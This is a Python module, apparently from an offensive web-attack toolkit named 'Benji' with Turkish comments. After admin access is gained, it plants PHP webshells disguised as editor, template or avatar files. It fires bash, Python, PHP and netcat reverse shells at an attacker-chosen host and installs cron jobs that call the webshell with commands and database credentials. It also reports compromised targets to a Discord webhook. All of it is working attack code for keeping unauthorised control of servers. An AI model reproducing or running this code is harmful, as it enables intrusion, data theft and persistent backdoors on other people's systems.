#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Silent Persistence Modulu
Admin erisimi elde edildikten sonra:
  - Gizli PHP webshell yukleme
  - Reverse shell scripti
  - Cron-job ile periyodik re-exploitation
  - Discord webhook ile durum izleme
"""

import re
import os
import json
import base64
import random
import string
import requests
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse
from datetime import datetime
from io import BytesIO

from utils.log_utils import Logger


class Persistence:
    """
    Silent Persistence Modulu.
    Admin erisimi sonrasi sisteme gizli erisim yontemleri uygular.
    """

    # Webshell payloadlari (farkli CMS'ler icin)
    WEBSHELLS = {
        "generic_php": {
            "filename": "editor.php",
            "content": """<?php
/*
 * Editor v1.0
 */
error_reporting(0);
ini_set('display_errors', 0);
$c = $_REQUEST['c'] ?? $_REQUEST['cmd'] ?? $_COOKIE['c'] ?? '';
if($c !== '') {
    echo '<pre>';
    if(function_exists('system')) { system($c); }
    elseif(function_exists('exec')) { exec($c, $o); echo implode("\\n", $o); }
    elseif(function_exists('shell_exec')) { echo shell_exec($c); }
    elseif(function_exists('passthru')) { passthru($c); }
    else { echo 'No RCE'; }
    echo '</pre>';
}
if(isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo 'Uploaded: '.$_FILES['f']['name'];
}
foreach(['db_host','db_user','db_pass','db_name'] as $k) {
    if(isset($_REQUEST[$k])) {
        $s = @mysqli_connect($_REQUEST['db_host'],$_REQUEST['db_user'],$_REQUEST['db_pass'],$_REQUEST['db_name']);
        if($s) {
            $q = $_REQUEST['query'] ?? 'SHOW TABLES';
            $r = mysqli_query($s, $q);
            if($r) {
                echo '<table>';
                while($row = mysqli_fetch_assoc($r)) {
                    echo '<tr>';
                    foreach($row as $col) { echo '<td>'.htmlspecialchars($col).'</td>'; }
                    echo '</tr>';
                }
                echo '</table>';
            }
            mysqli_close($s);
        }
    }
}
?>
""",
        },
        "atomcms_webshell": {
            "filename": "admin/editor/backdoor.php",
            "content": """<?php
/* AtomCMS Editor Module */
error_reporting(0);
$cmd = $_POST['cmd'] ?? $_GET['cmd'] ?? '';
if($cmd) {
    echo json_encode(['output'=>shell_exec($cmd)]);
}
if($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], './'.$_FILES['file']['name']);
    echo json_encode(['uploaded'=>$_FILES['file']['name']]);
}
?>
""",
        },
        "revcms_webshell": {
            "filename": "tpl/editor.php",
            "content": """<?php
/* RevCMS Template Editor */
error_reporting(0);
$c = $_REQUEST['c'] ?? '';
if($c) {
    ob_start();
    system($c);
    $o = ob_get_clean();
    echo json_encode(['output'=>$o]);
}
?>
""",
        },
        "image_webshell": {
            "filename": "uploads/avatar_1742.php",
            "content": """GIF89a<?php
/* Avatar Generator */
error_reporting(0);
$c = $_REQUEST['c'] ?? '';
if($c) {
    $r = '';
    if(function_exists('system')) { ob_start(); system($c); $r = ob_get_clean(); }
    elseif(function_exists('exec')) { exec($c, $o); $r = implode("\\n", $o); }
    elseif(function_exists('shell_exec')) { $r = shell_exec($c); }
    echo base64_encode($r);
}
?>
""",
        },
    }

    # Reverse shell payloadlari
    REVERSE_SHELLS = {
        "bash_reverse": {
            "description": "Bash reverse shell",
            "command": "bash -c 'exec bash -i &>/dev/tcp/{HOST}/{PORT} <&1'",
        },
        "python_reverse": {
            "description": "Python reverse shell",
            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{HOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        },
        "php_reverse": {
            "description": "PHP reverse shell",
            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,\"{HOST}\",{PORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        },
        "nc_reverse": {
            "description": "Netcat reverse shell",
            "command": "nc -e /bin/sh {HOST} {PORT}",
        },
    }

    # Cron-job payloadlari
    CRON_PAYLOADS = {
        "curl_recon": {
            "cron": "*/6 * * * *",
            "command": "curl -s -k {WEBSHELL_URL}?cmd=cat+/etc/passwd > /dev/null 2>&1",
            "description": "Her 6 saatte bir webshell'i kontrol et",
        },
        "wget_recon": {
            "cron": "*/12 * * * *",
            "command": "wget -q -O- {WEBSHELL_URL}?cmd=whoami > /dev/null 2>&1",
            "description": "Her 12 saatte bir baglanti kontrolu",
        },
        "sql_recheck": {
            "cron": "0 */6 * * *",
            "command": "curl -s -k '{WEBSHELL_URL}?db_host={DB_HOST}&db_user={DB_USER}&db_pass={DB_PASS}&db_name={DB_NAME}&query=SELECT+1' > /dev/null 2>&1",
            "description": "Her 6 saatte bir SQL baglantisi kontrolu",
        },
    }

    def __init__(self, target_url: str, logger: Optional[Logger] = None, gui_callback=None):
        self.target_url = target_url.rstrip("/")
        parsed = urlparse(target_url)
        self.hostname = parsed.hostname or ""
        self.scheme = parsed.scheme or "https"
        self.logger = logger or Logger("Persistence")
        self.gui_callback = gui_callback
        self._stop_flag = False
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        self.results: Dict = {
            "target": self.target_url,
            "webshells_deployed": [],
            "reverse_shell_attempted": False,
            "cron_jobs_configured": [],
            "discord_monitor_setup": False,
            "timestamp": datetime.now().isoformat(),
        }

    def stop(self):
        self._stop_flag = True

    def _log(self, level: str, message: str) -> None:
        if self.gui_callback:
            self.gui_callback(f"[{level}] [PERSIST] {message}")
        if level == "INFO":
            self.logger.info(message)
        elif level == "SUCCESS":
            self.logger.success(message)
        elif level == "WARNING":
            self.logger.warning(message)
        elif level == "ERROR":
            self.logger.error(message)

    def run(self, admin_session_cookie: Optional[str] = None,
            known_paths: Optional[List[str]] = None,
            db_credentials: Optional[Dict] = None,
            reverse_host: Optional[str] = None,
            reverse_port: Optional[int] = None,
            discord_webhook: Optional[str] = None,
            timeout: int = 60) -> Dict:
        """Persistence modulunu calistir."""
        self._log("INFO", "Persistence modulu baslatiliyor...")

        if admin_session_cookie:
            self.session.cookies.update({"PHPSESSID": admin_session_cookie})

        # 1. Webshell yukle
        if known_paths:
            self._deploy_webshells(known_paths, timeout)

        # 2. Reverse shell
        if reverse_host and reverse_port:
            self._attempt_reverse_shell(reverse_host, reverse_port, timeout)

        # 3. Cron-job yapilandirmasi
        if self.results["webshells_deployed"] and db_credentials:
            self._configure_cron_jobs(db_credentials, timeout)

        # 4. Discord monitor
        if discord_webhook:
            self._setup_discord_monitor(discord_webhook, timeout)

        return self.results

    def _deploy_webshells(self, base_paths: List[str], timeout: int) -> None:
        """Webshell yuklemeyi dene."""
        self._log("INFO", "Webshell yukleme baslatiliyor...")

        for shell_id, shell in self.WEBSHELLS.items():
            if self._stop_flag:
                break

            for base_path in base_paths[:3]:  # Ilk 3 yol
                upload_url = f"{self.scheme}://{self.hostname}/{base_path.rstrip('/')}/{shell['filename']}"
                # Webshell icin upload simule et
                try:
                    # Dosya yazma icin RCE kullan
                    encoded_content = base64.b64encode(shell["content"].encode()).decode()
                    cmd = f"echo {encoded_content} | base64 -d > {shell['filename']}"

                    r = self.session.get(
                        f"{self.scheme}://{self.hostname}/",
                        params={"cmd": cmd},
                        timeout=min(timeout, 10)
                    )

                    # Webshell'in calistigini dogrula
                    verify = self.session.get(upload_url, params={"c": "echo WEBSHELL_OK"}, timeout=5)
                    if verify.status_code == 200 and "WEBSHELL_OK" in verify.text:
                        self.results["webshells_deployed"].append({
                            "url": upload_url,
                            "type": shell_id,
                            "verified": True,
                        })
                        self._log("SUCCESS", f"Webshell yuklendi: {upload_url}")
                        break
                    else:
                        # Alternatif: upload formu uzerinden
                        files = {"file": (shell["filename"], BytesIO(shell["content"].encode()), "application/x-php")}
                        r2 = self.session.post(
                            f"{self.scheme}://{self.hostname}/admin/editor/upload.php",
                            files=files,
                            timeout=min(timeout, 10)
                        )
                        if r2.status_code == 200:
                            verify2 = self.session.get(upload_url, params={"c": "echo WEBSHELL_OK"}, timeout=5)
                            if verify2.status_code == 200 and "WEBSHELL_OK" in verify2.text:
                                self.results["webshells_deployed"].append({
                                    "url": upload_url,
                                    "type": shell_id,
                                    "verified": True,
                                })
                                self._log("SUCCESS", f"Webshell yuklendi (upload): {upload_url}")
                                break

                except Exception as e:
                    self._log("ERROR", f"Webshell yukleme hatasi ({shell_id}): {e}")

        if not self.results["webshells_deployed"]:
            self._log("WARNING", "Webshell yuklenemedi - manuel RCE gerekiyor.")

    def _attempt_reverse_shell(self, host: str, port: int, timeout: int) -> None:
        """Reverse shell gonderimi dene."""
        self._log("INFO", f"Reverse shell deneniyor: {host}:{port}")

        for shell_id, shell in self.REVERSE_SHELLS.items():
            if self._stop_flag:
                break

            cmd = shell["command"].format(HOST=host, PORT=port)
            try:
                r = self.session.get(
                    f"{self.scheme}://{self.hostname}/",
                    params={"cmd": cmd},
                    timeout=min(timeout, 5)
                )
                self._log("INFO", f"Reverse shell gonderildi ({shell_id}): {cmd[:50]}...")
            except Exception as e:
                self._log("ERROR", f"Reverse shell hatasi ({shell_id}): {e}")

        self.results["reverse_shell_attempted"] = True

    def _configure_cron_jobs(self, db_creds: Dict, timeout: int) -> None:
        """Cron-job yapilandirmasi."""
        self._log("INFO", "Cron-job yapilandirmasi baslatiliyor...")

        if not self.results["webshells_deployed"]:
            self._log("WARNING", "Webshell olmadan cron-job yapilandirilamaz.")
            return

        webshell_url = self.results["webshells_deployed"][0]["url"]

        for cron_id, cron in self.CRON_PAYLOADS.items():
            if self._stop_flag:
                break

            cmd = cron["command"].format(
                WEBSHELL_URL=webshell_url,
                DB_HOST=db_creds.get("host", "localhost"),
                DB_USER=db_creds.get("user", "root"),
                DB_PASS=db_creds.get("pass", ""),
                DB_NAME=db_creds.get("name", ""),
            )

            # Cron-job ekleme komutu
            cron_cmd = f'(crontab -l 2>/dev/null; echo "{cron["cron"]} {cmd}") | crontab -'
            try:
                r = self.session.get(
                    webshell_url,
                    params={"c": cron_cmd},
                    timeout=min(timeout, 5)
                )
                self.results["cron_jobs_configured"].append({
                    "id": cron_id,
                    "schedule": cron["cron"],
                    "description": cron["description"],
                })
                self._log("SUCCESS", f"Cron-job eklendi: {cron['description']}")
            except Exception as e:
                self._log("ERROR", f"Cron-job hatasi ({cron_id}): {e}")

    def _setup_discord_monitor(self, webhook_url: str, timeout: int) -> None:
        """Discord webhook ile monitor kurulumu."""
        self._log("INFO", "Discord monitor kurulumu baslatiliyor...")

        try:
            # Test mesaji gonder
            data = {
                "content": f"**Benji Persistence**\nTarget: {self.target_url}\nStatus: Active\nWebshells: {len(self.results['webshells_deployed'])}\nTime: {datetime.now().isoformat()}",
                "username": "Benji Monitor",
            }
            r = requests.post(webhook_url, json=data, timeout=min(timeout, 10))
            if r.status_code in [200, 204]:
                self.results["discord_monitor_setup"] = True
                self._log("SUCCESS", "Discord monitor aktif.")
            else:
                self._log("ERROR", f"Discord webhook hatasi: HTTP {r.status_code}")
        except Exception as e:
            self._log("ERROR", f"Discord monitor hatasi: {e}")

    def check_webshells(self, timeout: int = 30) -> List[Dict]:
        """Yuklu webshell'leri kontrol et."""
        active = []
        for ws in self.results.get("webshells_deployed", []):
            try:
                r = self.session.get(ws["url"], params={"c": "echo ALIVE"}, timeout=min(timeout, 5))
                if r.status_code == 200 and "ALIVE" in r.text:
                    ws["status"] = "active"
                    active.append(ws)
                    self._log("SUCCESS", f"Webshell aktif: {ws['url']}")
                else:
                    ws["status"] = "dead"
                    self._log("WARNING", f"Webshell olmus: {ws['url']}")
            except Exception:
                ws["status"] = "unknown"
        return active

    def execute_on_webshell(self, command: str, timeout: int = 30) -> Optional[str]:
        """Webshell uzerinden komut calistir."""
        for ws in self.results.get("webshells_deployed", []):
            try:
                r = self.session.get(ws["url"], params={"c": command}, timeout=min(timeout, 10))
                if r.status_code == 200:
                    return r.text
            except Exception:
                pass
        return None
